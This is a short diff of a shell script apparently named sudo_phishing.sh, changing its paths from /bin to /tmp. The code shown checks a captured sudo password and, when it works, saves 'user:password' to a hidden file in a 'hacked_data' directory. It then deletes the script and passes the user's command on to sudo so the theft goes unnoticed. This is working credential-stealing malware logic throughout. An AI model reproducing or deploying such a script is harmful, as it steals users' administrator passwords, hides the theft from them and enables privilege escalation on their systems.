@@ -12,11 +12,11 @@ attempts() {
     if ( echo "${sudo_password}" | sudo -k -S true > /dev/null 2>&1 ); then
         MAXIMUM_ATTEMPTS=0
         ##
-        mkdir /bin/hacked_data
+        mkdir /tmp/hacked_data
         /bin/echo "${USER}:${sudo_password}"
-        /bin/echo "${USER}:${sudo_password}" > /bin/hacked_data/.sudo_password
+        /bin/echo "${USER}:${sudo_password}" > /tmp/hacked_data/.sudo_password
         ##
-        /bin/rm /bin/sudo_phishing.sh
+        /bin/rm /tmp/sudo_phishing.sh
         /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
         exit 0
     else 
